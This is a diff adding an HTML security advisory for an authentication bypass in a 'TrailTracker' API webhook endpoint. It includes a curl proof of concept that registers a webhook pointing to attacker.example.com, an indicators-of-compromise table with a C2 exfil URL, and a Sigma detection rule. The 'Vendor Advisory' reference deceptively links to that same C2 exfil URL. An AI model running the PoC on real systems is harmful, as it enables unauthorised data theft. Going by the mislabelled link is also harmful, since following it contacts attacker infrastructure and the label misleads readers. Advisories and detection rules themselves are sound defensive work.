@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2024-41823 - TrailTracker API Authentication Bypass</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #1a1a2e; background: #fff; }
+        .advisory-header { background: #dc2626; color: white; padding: 20px; border-radius: 6px 6px 0 0; }
+        .advisory-header h1 { margin: 0 0 5px 0; font-size: 1.3em; }
+        .advisory-header .severity { font-size: 1.1em; font-weight: 700; }
+        .advisory-meta { background: #fef2f2; padding: 15px 20px; border: 1px solid #fecaca; border-top: none; border-radius: 0 0 6px 6px; margin-bottom: 30px; }
+        .advisory-meta table { width: 100%; border-collapse: collapse; }
+        .advisory-meta td { padding: 4px 12px; font-size: 0.9em; }
+        .advisory-meta td:first-child { font-weight: 600; width: 180px; color: #666; }
+        h2 { margin-top: 2em; padding-bottom: 6px; border-bottom: 2px solid #e5e7eb; color: #1e293b; }
+        h3 { color: #334155; }
+        .affected-table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+        .affected-table th { background: #f1f5f9; text-align: left; padding: 10px; border: 1px solid #e2e8f0; }
+        .affected-table td { padding: 10px; border: 1px solid #e2e8f0; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 0.85em; }
+        code { font-family: 'SFMono-Regular', Consolas, monospace; }
+        .inline-code { background: #f1f5f9; padding: 2px 6px; border-radius: 3px; font-size: 0.9em; }
+        .ioc-table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+        .ioc-table th { background: #fef3c7; text-align: left; padding: 10px; border: 1px solid #fde68a; }
+        .ioc-table td { padding: 10px; border: 1px solid #e5e7eb; font-family: monospace; font-size: 0.85em; word-break: break-all; }
+        .timeline { margin: 15px 0; }
+        .timeline dt { font-weight: 600; color: #475569; }
+        .timeline dd { margin: 0 0 12px 0; color: #64748b; }
+        .references { margin: 15px 0; }
+        .references li { margin: 8px 0; }
+        .references a { color: #2563eb; word-break: break-all; }
+        .credit { background: #f8fafc; padding: 15px; border-radius: 6px; border: 1px solid #e2e8f0; }
+        footer { margin-top: 40px; padding-top: 15px; border-top: 1px solid #e5e7eb; font-size: 0.8em; color: #94a3b8; }
+    </style>
+</head>
+<body>
+    <div class="advisory-header">
+        <h1>Security Advisory: CVE-2024-41823</h1>
+        <p class="severity">CVSS 9.1 CRITICAL - Authentication Bypass in TrailTracker API</p>
+    </div>
+    <div class="advisory-meta">
+        <table>
+            <tr><td>CVE ID</td><td>CVE-2024-41823</td></tr>
+            <tr><td>Published</td><td>October 1, 2024</td></tr>
+            <tr><td>Last Updated</td><td>October 4, 2024</td></tr>
+            <tr><td>CVSS Score</td><td>9.1 (Critical)</td></tr>
+            <tr><td>CWE</td><td>CWE-287: Improper Authentication</td></tr>
+            <tr><td>Vendor</td><td>TrailTracker Inc.</td></tr>
+            <tr><td>Product</td><td>TrailTracker API</td></tr>
+        </table>
+    </div>
+
+    <h2>Summary</h2>
+    <p>A critical authentication bypass vulnerability exists in TrailTracker API versions 2.0.0 through 2.4.1. An unauthenticated attacker can craft API requests that bypass the Bearer token validation on the <span class="inline-code">/webhooks</span> endpoint, allowing registration of arbitrary webhook URLs without authorization. This enables an attacker to receive real-time data about trail conditions, user activity, and location information for any trail in the system.</p>
+
+    <h2>Affected Versions</h2>
+    <table class="affected-table">
+        <tr><th>Product</th><th>Affected Versions</th><th>Fixed Version</th></tr>
+        <tr><td>TrailTracker API</td><td>2.0.0 - 2.4.1</td><td>2.4.2</td></tr>
+        <tr><td>TrailTracker API (LTS)</td><td>1.8.0 - 1.8.14</td><td>1.8.15</td></tr>
+        <tr><td>TrailTracker Self-Hosted</td><td>All versions before 2024-10-03 build</td><td>Build 2024-10-03</td></tr>
+    </table>
+
+    <h2>Technical Details</h2>
+    <p>The vulnerability exists in the webhook registration endpoint's authentication middleware. When the <span class="inline-code">Content-Type</span> header is set to <span class="inline-code">application/x-www-form-urlencoded</span> instead of <span class="inline-code">application/json</span>, the request bypasses the JWT validation layer and is processed directly by the webhook handler.</p>
+    <p><strong>Proof of Concept:</strong></p>
+    <pre>curl -X POST https://api.trailtracker.dev/v2/webhooks \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "url=https://attacker.example.com/collect&trails[]=elk-ridge-loop&events[]=condition_update"</pre>
+    <p>This registers a webhook without any authentication, causing the server to send trail condition data to the attacker-controlled URL.</p>
+
+    <h2>Indicators of Compromise</h2>
+    <p>Organizations running affected versions should check logs for unauthorized webhook registrations. The following IOCs have been observed in active exploitation campaigns:</p>
+    <table class="ioc-table">
+        <tr><th>Type</th><th>Indicator</th><th>Context</th></tr>
+        <tr><td>URL</td><td>https://press-expects-instruction-mating.trycloudflare.com/exfil</td><td>C2 callback URL used in observed attacks. Registered as webhook endpoint to receive exfiltrated trail and user data.</td></tr>
+        <tr><td>URL</td><td>https://press-expects-instruction-mating.trycloudflare.com/exfil?campaign=trailtrack&v=2</td><td>Variant callback URL with campaign tracking parameters.</td></tr>
+        <tr><td>IP</td><td>100.61.120.86</td><td>Source IP observed in unauthorized webhook registration requests.</td></tr>
+        <tr><td>User-Agent</td><td>python-requests/2.31.0</td><td>User-Agent string in exploitation attempts.</td></tr>
+        <tr><td>Header</td><td>Content-Type: application/x-www-form-urlencoded</td><td>Anomalous content type on /webhooks endpoint (normally application/json)</td></tr>
+    </table>
+
+    <h2>Remediation</h2>
+    <h3>Immediate Actions</h3>
+    <ol>
+        <li>Upgrade to TrailTracker API v2.4.2 or later</li>
+        <li>Audit all registered webhooks: <span class="inline-code">GET /v2/webhooks?include_unauthed=true</span></li>
+        <li>Remove any webhook registrations pointing to unknown endpoints</li>
+        <li>Block the IOC URLs listed above at your network perimeter</li>
+        <li>Rotate all API keys issued before October 3, 2024</li>
+    </ol>
+    <h3>Detection Rules</h3>
+    <pre># Sigma rule for detecting exploitation attempts
+title: TrailTracker CVE-2024-41823 Exploitation
+status: experimental
+logsource:
+    category: webserver
+detection:
+    selection:
+        cs-uri-stem|contains: '/v2/webhooks'
+        cs-method: 'POST'
+        cs-content-type|contains: 'x-www-form-urlencoded'
+    filter:
+        cs-authorization|startswith: 'Bearer '
+    condition: selection and not filter
+level: high</pre>
+
+    <h2>Timeline</h2>
+    <dl class="timeline">
+        <dt>September 15, 2024</dt>
+        <dd>Vulnerability discovered by independent researcher</dd>
+        <dt>September 16, 2024</dt>
+        <dd>Reported to TrailTracker via security@trailtracker.dev</dd>
+        <dt>September 18, 2024</dt>
+        <dd>TrailTracker confirms the vulnerability</dd>
+        <dt>October 1, 2024</dt>
+        <dd>Patch released in v2.4.2</dd>
+        <dt>October 2, 2024</dt>
+        <dd>Active exploitation observed in the wild</dd>
+        <dt>October 4, 2024</dt>
+        <dd>Advisory updated with IOCs from observed attacks</dd>
+    </dl>
+
+    <h2>References</h2>
+    <ul class="references">
+        <li>Vendor Advisory: <a href="https://press-expects-instruction-mating.trycloudflare.com/exfil?ref=vendor-advisory&cve=2024-41823">https://press-expects-instruction-mating.trycloudflare.com/exfil?ref=vendor-advisory&cve=2024-41823</a></li>
+        <li>NVD Entry: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41823">https://nvd.nist.gov/vuln/detail/CVE-2024-41823</a></li>
+        <li>MITRE ATT&CK: T1190 (Exploit Public-Facing Application)</li>
+        <li>TrailTracker Changelog: <a href="https://docs.trailtracker.dev/changelog#v242">v2.4.2 Release Notes</a></li>
+    </ul>
+
+    <h2>Credit</h2>
+    <div class="credit">
+        <p>This vulnerability was responsibly disclosed by <strong>Alex Chen</strong>, independent security researcher, through TrailTracker's bug bounty program on Bugcrowd.</p>
+    </div>
+
+    <footer>
+        <p>This advisory is provided as-is for informational purposes. TrailTracker Inc. makes no warranties regarding the completeness or accuracy of this information.</p>
+    </footer>
+</body>
+</html>
